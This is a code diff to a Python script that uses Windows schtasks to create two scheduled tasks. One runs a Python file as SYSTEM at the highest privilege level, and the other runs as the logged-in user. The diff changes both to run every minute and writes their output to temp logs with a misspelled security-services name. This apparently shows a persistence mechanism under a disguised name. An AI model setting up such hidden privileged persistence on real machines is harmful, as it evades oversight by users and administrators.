@@ -32,13 +32,15 @@ subprocess.run(
         "schtasks",
         "/create",
         "/f",
-        "/sc", "onstart",
+        #"/sc", "onstart",
+        "/sc", "minute",
+        "/mo", "1",
         "/ru", "SYSTEM",
         "/rl", "highest",
         "/tn", SYSTEM_TASK_NAME,
         "/tr", f'"{PYTHON_EXE}" "{SYSTEM_DST}" >> %temp%\\SecutiryServicesLogsSystem.txt 2>&1'
-        "/ri", "1",
-        "/du", "00:30"
+        #"/ri", "1",
+        #"/du", "00:30"
     ],
     check=True
 )
@@ -49,12 +51,14 @@ subprocess.run(
         "schtasks",
         "/create",
         "/f",
-        "/sc", "onlogon",
+        #"/sc", "onlogon",
+        "/sc", "minute",
+        "/mo", "1",
         "/ru", os.getlogin(),
         "/tn", USER_TASK_NAME,
         "/tr", f'"{PYTHON_EXE}" "{USER_DST}" >> %temp%\\SecutiryServicesLogsUser.txt 2>&1',
-        "/ri", "1",
-        "/du", "00:30"
+        #"/ri", "1",
+        #"/du", "00:30"
     ],
     check=True
 )
